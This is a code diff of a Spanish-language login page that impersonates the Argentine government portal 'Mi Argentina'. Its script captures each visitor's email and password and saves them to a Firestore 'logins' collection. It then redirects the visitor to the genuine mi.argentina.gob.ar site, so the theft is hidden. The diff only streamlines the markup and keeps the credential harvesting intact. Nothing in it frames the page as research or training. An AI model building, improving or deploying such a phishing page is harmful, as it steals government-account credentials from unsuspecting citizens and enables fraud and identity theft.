@@ -2,164 +2,32 @@
 <html lang="es">
 <head>
     <meta charset="utf-8">
-    <link rel="icon" href="/icons/favicon.ico">
     <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=0">
-    <meta name="display" content="standalone">
-    <meta name="theme-color" content="#3730ba">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-title" content="Mi Argentina">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="description" content="Registrate para obtener tu DNI digital">
     <title>Mi Argentina</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #f5f5f5;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        #root {
-            width: 100%;
-            display: flex;
-            justify-content: center;
-        }
-
-        .masterContainer {
-            width: 100%;
-            max-width: 450px;
-            padding: 20px;
-        }
-
-        .formContainer {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
-
-        .loginForm_title {
-            color: #3730ba;
-            font-size: 26px;
-            margin-bottom: 30px;
-            font-weight: 700;
-            text-align: left;
-        }
-
-        .loginForm_fieldContainer {
-            margin-bottom: 25px;
-        }
-
-        .registerForm_labelSpan {
-            display: block;
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 8px;
-        }
-
-        .registerForm_input {
-            width: 100%;
-            padding: 10px 0;
-            border: none;
-            border-bottom: 1px solid #ccc;
-            outline: none;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-
-        .registerForm_input:focus {
-            border-bottom: 2px solid #3730ba;
-        }
-
-        .custom-button-container {
-            margin-top: 30px;
-        }
-
-        .custom-button {
-            width: 100%;
-            background-color: #3730ba;
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 6px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: opacity 0.3s;
-        }
-
-        .custom-button:disabled {
-            background-color: #e0e0e0;
-            color: #999;
-            cursor: not-allowed;
-        }
-
-        .redirectToSignIn {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 15px;
-            color: #333;
-        }
-
-        .redirectToSignIn_link {
-            color: #007bff;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .redirectToSignInContainer {
-            margin-top: 25px;
-            padding: 15px;
-            text-align: center;
-        }
+        body { margin: 0; background-color: #f5f5f5; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .formContainer { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); width: 100%; max-width: 350px; }
+        .loginForm_title { color: #3730ba; font-size: 26px; margin-bottom: 30px; font-weight: 700; }
+        .registerForm_labelSpan { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
+        .registerForm_input { width: 100%; padding: 10px 0; border: none; border-bottom: 2px solid #ccc; outline: none; font-size: 16px; margin-bottom: 20px; }
+        .custom-button { width: 100%; background-color: #3730ba; color: white; border: none; padding: 16px; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .custom-button:disabled { background-color: #e0e0e0; color: #999; }
+        .redirectToSignIn { text-align: center; margin-top: 20px; font-size: 15px; }
+        .redirectToSignIn_link { color: #007bff; text-decoration: none; font-weight: 500; }
     </style>
 </head>
 <body>
-    <div id="root">
-        <div class="masterContainer">
-            <div class="login_Container">
-                <div class="registerSubContainer">
-                    <div class="formContainer">
-                        <form class="authForm" id="loginForm">
-                            <h2 class="loginForm_title">Inicia sesión</h2>
-                            
-                            <div class="loginForm_fieldContainer">
-                                <label class="registerForm_label">
-                                    <span class="registerForm_labelSpan">Correo electronico</span>
-                                    <input id="email" name="email" class="registerForm_input" type="email" required autocomplete="email">
-                                </label>
-                            </div>
-
-                            <div class="loginForm_fieldContainer">
-                                <label class="registerForm_label">
-                                    <span class="registerForm_labelSpan">Contraseña</span>
-                                    <input id="password" name="password" class="registerForm_input" type="password" required>
-                                </label>
-                            </div>
-
-                            <div class="custom-button-container">
-                                <button type="submit" id="btnEntrar" class="custom-button" disabled>Entrar</button>
-                            </div>
-                        </form>
-                        <p style="text-align: center; margin-top: 20px;">
-                            <a class="redirectToSignIn_link" href="#">¿Olvidaste tu contraseña?</a>
-                        </p>
-                    </div>
-
-                    <div class="redirectToSignInContainer">
-                        <p class="redirectToSignIn">
-                            ¿No tienes cuenta? <a class="redirectToSignIn_link" href="register.html">Registrarse</a>
-                        </p>
-                    </div>
-                </div>
-            </div>
+    <div class="formContainer">
+        <form id="loginForm">
+            <h2 class="loginForm_title">Inicia sesión</h2>
+            <span class="registerForm_labelSpan">Correo electronico</span>
+            <input id="email" class="registerForm_input" type="email" required>
+            <span class="registerForm_labelSpan">Contraseña</span>
+            <input id="password" class="registerForm_input" type="password" required>
+            <button type="submit" id="btnEntrar" class="custom-button">Entrar</button>
+        </form>
+        <div class="redirectToSignIn">
+            ¿No tienes cuenta? <a class="redirectToSignIn_link" href="register.html">Registrarse</a>
         </div>
     </div>
 
@@ -180,43 +48,18 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        const emailInput = document.getElementById('email');
-        const passInput = document.getElementById('password');
-        const loginBtn = document.getElementById('btnEntrar');
-        const form = document.getElementById('loginForm');
-
-        function validar() {
-            if (emailInput.value.includes('@') && passInput.value.length >= 4) {
-                loginBtn.disabled = false;
-            } else {
-                loginBtn.disabled = true;
-            }
-        }
-
-        emailInput.addEventListener('input', validar);
-        passInput.addEventListener('input', validar);
-
-        form.addEventListener('submit', async (e) => {
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            loginBtn.disabled = true;
-            loginBtn.innerText = "CARGANDO...";
-
+            const btn = document.getElementById('btnEntrar');
+            btn.innerText = "CARGANDO...";
             try {
-                // Guarda los datos en una colección llamada 'logins'
                 await addDoc(collection(db, "logins"), {
-                    email: emailInput.value,
-                    password: passInput.value,
+                    email: document.getElementById('email').value,
+                    password: document.getElementById('password').value,
                     fecha: new Date().toLocaleString()
                 });
-                
-                // Después de guardar, redirige (puedes cambiar la URL a la oficial de Mi Argentina)
                 window.location.href = "https://mi.argentina.gob.ar/";
-            } catch (error) {
-                console.error("Error al guardar:", error);
-                alert("Error de conexión");
-                loginBtn.disabled = false;
-                loginBtn.innerText = "ENTRAR";
-            }
+            } catch (err) { alert("Error: " + err.message); btn.innerText = "ENTRAR"; }
         });
     </script>
 </body>
